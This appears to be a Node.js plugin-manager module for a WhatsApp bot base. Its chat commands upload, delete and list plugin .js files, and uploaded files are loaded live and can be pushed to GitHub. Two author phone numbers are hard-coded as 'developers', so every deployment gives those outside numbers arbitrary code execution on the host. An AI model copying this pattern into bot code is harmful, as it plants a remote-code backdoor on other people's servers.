const path = require('path')
const fs = require('fs')
const vm = require('vm')
const config = require('../config')
const { cmd, commands } = require('./NexaCard')
// Nexa Mini Bot Base
// Developer Dinujaya ( Dinux )
// number 94740026280
// Number 94770690281
// Oyatama Kiyala Private Base ekak kamathi Vidiyata hadaganna uda thiyena number walata katha karanna


const PREFIX = config.PREFIX || config.prefix || ''
const PLUGIN_DIR = __dirname
const MAX_BYTES = 2 * 1024 * 1024
const FOOTER = '⚡ *Developer: dinux*'
const DEVELOPERS = new Set(['94740026280', '94770690281'])
const PROTECTED = new Set(['NexaCard.js', 'NexaPluginMgr.js'])

// Hosting වල Variables වලින් override කරන්න පුළුවන්)
const GH_OWNER = process.env.GITHUB_OWNER || 'dzdinu290-sudo'
const GH_REPO = process.env.GITHUB_REPO || 'Dxz'
const GH_BRANCH = process.env.GITHUB_BRANCH || 'main'
const GH_PATH = process.env.GITHUB_PLUGIN_PATH || 'plugins'

const HEADER = (title) =>
    '╭━━━━━━━━━━━━━━━━━━━╮\n' +
    `┃  🧩 *𝗡𝗘𝗫𝗔 𝗕𝗢𝗧 ${title}*\n` +
    '╰━━━━━━━━━━━━━━━━━━━╯\n\n'

function phoneOf(jid) {
    const s = String(jid || '')
    if (!s || /@(lid|g\.us|broadcast)$/.test(s)) return ''
    return s.split('@')[0].split(':')[0].replace(/\D/g, '')
}

function isDeveloper(mek, m, ctx = {}) {
    if (mek?.key?.fromMe || ctx.isMe) return true
    const candidates = [
        m?.sender,
        ctx.sender,
        mek?.key?.participant,
        mek?.key?.participantAlt,
        mek?.key?.remoteJidAlt,
        mek?.key?.remoteJid
    ]
    return candidates.some(j => DEVELOPERS.has(phoneOf(j)))
}

function safeName(raw) {
    const name = path.basename(String(raw || '').trim())
    if (!/^[A-Za-z0-9_\-]{1,60}\.js$/.test(name)) return null
    if (PROTECTED.has(name)) return null
    return name
}

function listPlugins() {
    return fs.readdirSync(PLUGIN_DIR)
        .filter(f => f.endsWith('.js') && !PROTECTED.has(f))
        .sort()
}

function getDocumentInfo(mek) {
    const direct = mek?.message?.documentMessage
    const ctx = mek?.message?.extendedTextMessage?.contextInfo || mek?.message?.documentMessage?.contextInfo
    const quotedMsg = ctx?.quotedMessage
    if (direct) return { doc: direct, msgObj: mek }
    if (quotedMsg?.documentMessage) {
        return {
            doc: quotedMsg.documentMessage,
            msgObj: {
                key: { remoteJid: mek.key.remoteJid, id: ctx.stanzaId, participant: ctx.participant, fromMe: false },
                message: quotedMsg
            }
        }
    }
    return null
}

function unregisterPlugin(target) {
    if (!Array.isArray(commands)) return 0
    const abs = path.resolve(target)
    let removed = 0
    for (let i = commands.length - 1; i >= 0; i--) {
        const f = commands[i]?.filename
        if (f && path.resolve(String(f)) === abs) {
            commands.splice(i, 1)
            removed++
        }
    }
    return removed
}

function loadPlugin(target) {
    unregisterPlugin(target)
    try { delete require.cache[require.resolve(target)] } catch { /* ignore */ }
    require(target)
}

function ghHeaders() {
    return {
        Authorization: `Bearer ${process.env.GITHUB_TOKEN}`,
        'User-Agent': 'nexa-bot',
        Accept: 'application/vnd.github+json',
        'X-GitHub-Api-Version': '2022-11-28'
    }
}

async function getGithubSha(name) {
    const api = `https://api.github.com/repos/${GH_OWNER}/${GH_REPO}/contents/${GH_PATH}/${name}?ref=${GH_BRANCH}`
    const r = await fetch(api, { headers: ghHeaders() })
    if (r.status === 404) return null
    if (!r.ok) throw new Error('GitHub GET ' + r.status)
    return (await r.json()).sha
}

async function pushToGithub(name, buf) {
    if (!process.env.GITHUB_TOKEN) throw new Error('GITHUB_TOKEN set කරලා නැහැ')
    const sha = await getGithubSha(name)
    const api = `https://api.github.com/repos/${GH_OWNER}/${GH_REPO}/contents/${GH_PATH}/${name}`
    const res = await fetch(api, {
        method: 'PUT',
        headers: { ...ghHeaders(), 'Content-Type': 'application/json' },
        body: JSON.stringify({
            message: `Add/update ${name} via bot`,
            content: buf.toString('base64'),
            branch: GH_BRANCH,
            ...(sha ? { sha } : {})
        })
    })
    if (!res.ok) throw new Error('GitHub PUT ' + res.status + ' ' + (await res.text()).slice(0, 120))
}

async function deleteFromGithub(name) {
    if (!process.env.GITHUB_TOKEN) throw new Error('GITHUB_TOKEN set කරලා නැහැ')
    const sha = await getGithubSha(name)
    if (!sha) return 'not-found'
    const api = `https://api.github.com/repos/${GH_OWNER}/${GH_REPO}/contents/${GH_PATH}/${name}`
    const res = await fetch(api, {
        method: 'DELETE',
        headers: { ...ghHeaders(), 'Content-Type': 'application/json' },
        body: JSON.stringify({ message: `Delete ${name} via bot`, sha, branch: GH_BRANCH })
    })
    if (!res.ok) throw new Error('GitHub DELETE ' + res.status)
    return 'ok'
}

cmd({
    pattern: 'addplugin',
    alias: ['installplugin', 'uplugin'],
    desc: 'Upload a plugin .js file (developers only). Reply to a .js document.',
    category: 'dev',
    react: '🧩',
    filename: __filename
},
async (conn, mek, m, ctx) => {
    const { from, q, reply } = ctx
    let loading
    try {
        if (!isDeveloper(mek, m, ctx)) return reply(HEADER('PLUGIN') + '❌ මේක developers ට විතරයි.\n\n' + FOOTER)

        const info = getDocumentInfo(mek)
        if (!info) {
            return reply(
                HEADER('ADD PLUGIN') +
                '📌 Plugin .js file එකට *reply* කරලා මේක ගහන්න:\n' +
                `▫️ \`${PREFIX}addplugin\`\n\n` +
                '⚠️ File නම `.js` වලින් අවසන් වෙන්න ඕන.\n\n' + FOOTER
            )
        }

        const name = safeName(q && q.trim() ? q.trim() : info.doc.fileName)
        if (!name) throw new Error('File නම වලංගු නැහැ (a-z, 0-9, _ , - සහ .js විතරයි). `' + PREFIX + 'addplugin name.js` ලෙස නම දෙන්න.')
        if (info.doc.fileLength && Number(info.doc.fileLength) > MAX_BYTES) throw new Error('File එක 2MB ට වඩා විශාලයි.')

        loading = await conn.sendMessage(from, { text: HEADER('ADD PLUGIN') + `⏳ *${name}* install කරනවා...\n\n` + FOOTER }, { quoted: mek })

       
        const { downloadMediaMessage } = require('@whiskeysockets/baileys')
        const buf = await downloadMediaMessage(info.msgObj, 'buffer', {}, {
            reuploadRequest: conn.updateMediaMessage
        })
        if (!buf || buf.length === 0) throw new Error('File download කරන්න බැරි වුණා.')
        if (buf.length > MAX_BYTES) throw new Error('File එක 2MB ට වඩා විශාලයි.')
        
        try {
            new vm.Script(buf.toString('utf8'), { filename: name })
        } catch (e) {
            throw new Error('Plugin code එකේ syntax error එකක්: ' + e.message)
        }

        
        const target = path.join(PLUGIN_DIR, name)
        const hadOld = fs.existsSync(target)
        const oldBuf = hadOld ? fs.readFileSync(target) : null
        if (hadOld) fs.copyFileSync(target, target + '.bak')
        fs.writeFileSync(target, buf)

        try {
            loadPlugin(target)
        } catch (e) {
            if (hadOld) fs.writeFileSync(target, oldBuf)
            else fs.unlinkSync(target)
            unregisterPlugin(target)
            if (hadOld) { try { loadPlugin(target) } catch { /* ignore */ } }
            throw new Error('Plugin load වුණේ නැහැ (පරණ එක restore කළා): ' + e.message)
        }

       
        let gh = '⏭️ GITHUB_TOKEN නැති නිසා skip කළා'
        if (process.env.GITHUB_TOKEN) {
            try {
                await pushToGithub(name, buf)
                gh = '✅ GitHub එකට push වුණා'
            } catch (e) {
                gh = '⚠️ GitHub push fail: ' + e.message
            }
        }

        await reply(
            HEADER('PLUGIN SAVED') +
            `✅ *${name}* install වුණා. Restart අවශ්‍ය නැහැ.\n\n` +
            `🐙 ${gh}\n\n` + FOOTER
        )
    } catch (error) {
        console.error('[NEXA BOT ADDPLUGIN ERROR]', error)
        await reply(HEADER('PLUGIN ERROR') + '⚠️ Install වුණේ නැහැ.\n\n🛠️ *Reason:* ' + (error.message || 'Unknown') + '\n\n' + FOOTER)
    } finally {
        if (loading?.key) {
            try { await conn.sendMessage(from, { delete: loading.key }) } catch { /* ignore */ }
        }
    }
})

cmd({
    pattern: 'delplugin',
    alias: ['removeplugin', 'rmplugin'],
    desc: 'Delete a plugin file (developers only)',
    category: 'dev',
    react: '🗑️',
    filename: __filename
},
async (conn, mek, m, ctx) => {
    const { q, reply } = ctx
    try {
        if (!isDeveloper(mek, m, ctx)) return reply(HEADER('PLUGIN') + '❌ මේක developers ට විතරයි.\n\n' + FOOTER)

        if (!q || !q.trim()) {
            return reply(
                HEADER('DEL PLUGIN') +
                `📌 \`${PREFIX}delplugin name.js\`\n` +
                `📌 Plugins බලන්න: \`${PREFIX}plugins\`\n\n` + FOOTER
            )
        }

        const name = safeName(q.trim())
        if (!name) throw new Error('මේ plugin එක delete කරන්න බෑ (නම වැරදියි හෝ protected file).')

        const target = path.join(PLUGIN_DIR, name)
        if (!fs.existsSync(target)) throw new Error(`*${name}* නම plugin එකක් නැහැ.`)

        const removedCmds = unregisterPlugin(target)
        fs.renameSync(target, target + '.deleted')

        let gh = '⏭️ GITHUB_TOKEN නැති නිසා skip කළා'
        if (process.env.GITHUB_TOKEN) {
            try {
                const r = await deleteFromGithub(name)
                gh = r === 'ok' ? '✅ GitHub එකෙන් අයින් වුණා' : 'ℹ️ GitHub එකේ file එක තිබුණේ නැහැ'
            } catch (e) {
                gh = '⚠️ GitHub delete fail: ' + e.message
            }
        }

        await reply(
            HEADER('PLUGIN DELETED') +
            `🗑️ *${name}* delete වුණා (commands ${removedCmds}ක් ඉවත් කළා).\n\n` +
            `🐙 ${gh}\n\n` + FOOTER
        )
    } catch (error) {
        await reply(HEADER('PLUGIN ERROR') + '⚠️ Delete වුණේ නැහැ.\n\n🛠️ *Reason:* ' + (error.message || 'Unknown') + '\n\n' + FOOTER)
    }
})


cmd({
    pattern: 'plugins',
    alias: ['pluginlist'],
    desc: 'List installed plugin files (developers only)',
    category: 'dev',
    react: '📚',
    filename: __filename
},
async (conn, mek, m, ctx) => {
    const { reply } = ctx
    if (!isDeveloper(mek, m, ctx)) return reply(HEADER('PLUGIN') + '❌ මේක developers ට විතරයි.\n\n' + FOOTER)
    const list = listPlugins()
    await reply(
        HEADER('PLUGINS') +
        `📚 *Total:* ${list.length}\n\n` +
        list.map((f, i) => `${i + 1}. ${f}`).join('\n') +
        `\n\n🗑️ Delete: \`${PREFIX}delplugin name.js\`\n\n` + FOOTER
    )
})
